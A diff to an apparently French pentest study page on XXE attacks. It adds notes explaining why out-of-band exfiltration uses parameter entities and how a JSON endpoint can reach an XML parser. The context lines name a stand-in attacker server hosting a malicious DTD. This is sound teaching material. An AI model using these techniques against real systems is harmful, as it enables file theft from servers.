@@ -73,6 +73,9 @@ XXE (XML External Entity) exploite le traitement des entités externes XML pour 
 
 Quand le serveur traite le XXE mais n'affiche pas la valeur, on utilise une DTD externe hébergée sur notre serveur.
 
+> [!important] Idée clé
+> Pourquoi utiliser des **entités de paramètre** (`%file`, `%send`) plutôt que des entités classiques (`&xxe;`) pour l'exfiltration OOB ? Parce que la spécification XML interdit à une entité générale de référencer une autre entité générale dans le sous-ensemble interne de la DTD, mais autorise les entités de paramètre à se combiner entre elles. C'est cette règle de la spec — pas un choix arbitraire de syntaxe — qui force le détour par `%file`/`%send`/`%exfil` pour construire dynamiquement une URL contenant le contenu d'un fichier.
+
 ```bash
 # 1. Héberger une DTD malveillante sur notre serveur
 # http://attaquant.com/evil.dtd
@@ -147,6 +150,9 @@ Quand les erreurs XML sont affichées dans la réponse :
 ## XXE via formats alternatifs
 
 XXE n'est pas limité aux requêtes XML directes. Tout format parsé en XML peut être vulnérable.
+
+> [!warning] Piège
+> Un endpoint qui n'accepte "que du JSON" n'est pas automatiquement à l'abri : si le même contrôleur backend route aussi vers un parseur XML pour d'autres formats (SOAP, upload de documents Office), changer simplement le `Content-Type` d'une requête JSON vers `application/xml` peut suffire à atteindre ce parseur — la surface XXE réelle d'une application dépasse souvent les endpoints qui semblent traiter du XML.
 
 ```bash
 # DOCX / XLSX / PPTX (archives ZIP contenant du XML)
